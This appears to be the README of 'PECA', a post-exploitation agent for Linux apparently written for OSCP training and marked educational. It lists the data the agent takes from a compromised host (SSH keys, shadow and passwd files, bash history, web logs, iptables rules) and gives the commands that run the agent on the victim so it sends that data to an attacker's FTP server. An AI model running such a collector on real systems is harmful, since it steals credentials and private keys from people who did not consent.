# PECA
Post Exploitation Collection Agent

##### Requirments
    To run the server you will need to have pyftpdlib installed
     
Note: For educational use only
```
            ____  _______________
           / __ \/ ____/ ____/   |
          / /_/ / __/ / /   / /| |
         / ____/ /___/ /___/ ___ |
        /_/   /_____/\____/_/  |_|
    Post Exploitation Collection Agent 
```
##### Intro:
    Peca was designed to help collect key files from linux 
    machines after exploitation has occured. Originally
    designed to help with data gathering during the OSCP

##### Features:

	* Collects ssh keys from root and home directories
	* Collects .bash* from root and home directories
	* Collects passwd/shadow/group files
  * Collects webservice logs from popular services
	* Collects IPTable data
  

##### Use:

Simple start the server *Sudo is needed for port 21*
```
    ./server.py --ip <iphere> --port 21 --user user --password user
```

Then drop the peca script on the client
```
    ./peca.py --server <iphere> --port 21 --user user --password user
```

##### Technical:
```
	Communicates utilizing the ftp protocol.
```